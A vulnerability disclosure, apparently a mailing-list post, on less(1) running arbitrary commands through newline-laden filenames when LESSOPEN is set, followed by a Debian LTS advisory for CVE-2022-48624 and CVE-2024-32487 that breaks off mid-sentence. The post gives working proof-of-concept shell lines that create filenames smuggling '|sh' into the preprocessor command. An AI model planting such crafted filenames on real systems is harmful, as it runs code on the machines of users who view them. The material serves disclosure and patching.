From: Jakub Wilk <jwilk@...lk.net>

Subject: less(1) with LESSOPEN mishandles \n in paths

less(1) does not correctly escape newlines in pathnames when
constructing command line of the input preprocessor. If a user ran
less(1) on files with untrusted names, this could result in execution of
arbitrary code.

The input preprocessor is enabled by the LESSOPEN environment variable.
But if you didn't set it, don't worry, because zless(1) (or xzless(1),
or zstdless(1)) sets it for you:

    $ echo 'cowsay pwned' > './\' && touch "$(printf '\n|sh')"
    $ zless ./*
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||
    ./
    |sh (file 1 of 2) (END) - Next: ./\

On Ubuntu systems, $LESSOPEN is set in ~/.bashrc by default, so the bug
can be exploited even without the wrapper:

    $ mkdir m "$(printf '\n|m')" && touch "$(printf '\n|m/oo')" && echo 'cowsay pwned' > m/oo && chmod +x m/oo
    $ less ./*/*
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||
    ./
    |m/oo (file 1 of 2) (END) - Next: ./m/oo

Package        : less
Version        : 487-0.1+deb10u1
CVE ID         : CVE-2022-48624 CVE-2024-32487
Debian Bug     : 1064293 1068938

Security vulnerabilities were found in less, a pager program similar to
more, which could result in arbitrary command execution when processing
files with crafted names.

CVE-2022-48624

    It was discovered that LESSCLOSE handling in less did not quote
    shell metacharacters.

CVE-2024-32487

    It was discovered that filenames containing a newline character
    could result in arbitrary command execution during input
    preprocessor invocation.

For Debian 10 buster, these problems have been fixed in version
487-0.1+deb10u1.

We recommend that you upgrade your less packages.

For the detailed security status of less please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/less>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
